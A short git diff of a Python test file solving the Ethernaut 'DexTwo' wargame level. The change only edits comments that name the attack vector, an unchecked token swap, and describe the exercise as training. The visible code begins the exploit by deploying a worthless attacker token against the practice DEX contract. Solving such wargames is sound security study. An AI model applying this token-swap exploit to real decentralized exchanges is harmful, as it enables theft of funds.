@@ -11,7 +11,9 @@ def test_lv23():
     ethernaut.check_lv23(contract)
 
 def exploit_lv23(contract: DexTwo, attacker: Account):
-    # Attack vector: inteeger division (rounding down in favor of the attacker) + unchecked token swap
+    # Attack vector: unchecked token swap
+    # Training: learning how simple DEX works and where is the main source of mistakes
+
     t1 = SwappableTokenTwo(contract.token1())
     t2 = SwappableTokenTwo(contract.token2())
     attack_token = SwappableTokenTwo.deploy(contract.address, "No value token :)", "SHT1", 1000)
